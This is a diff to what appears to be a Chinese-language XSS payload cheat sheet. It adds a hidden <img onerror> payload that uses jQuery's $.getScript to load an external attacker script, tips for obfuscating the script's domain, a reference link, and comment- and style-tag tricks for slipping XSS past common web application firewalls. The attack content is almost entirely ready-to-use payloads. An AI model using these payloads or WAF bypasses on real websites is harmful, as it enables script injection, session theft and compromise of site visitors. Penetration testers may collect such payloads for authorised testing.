@@ -10,6 +10,7 @@
 3.引号内容可以转10进制或者16进制
 4.style=display:none  #设置成无显示，PS：有些标签不一定支持
 5.域名可以换成真实IP、url编码、双字节编码、16进制、8进制
+6.网站有jq可以使用$.getScript("js地址")
 ```
 
 
@@ -26,14 +27,26 @@
 
 ```
 https://www.freebuf.com/articles/web/153055.html
+https://www.cnblogs.com/wjrblogs/p/12341190.html
 ```
 
 
 
-### 网站含jq可用该函数
+### 图片加载错误执行js代码（不显示图片）
 
 ```
 <img/src=# style=display:none onerror=$.getScript("js地址")>
+```
+
+bypass 常规waf
+
+```
+冷门标签绕过：
+
+`!-- --`绕过:
+`<!--<img src="--><img src onerror=alert(1)//">`
+
+`<style><img src="</style><img src onerror=alert(1)//">`
 ```
 
 
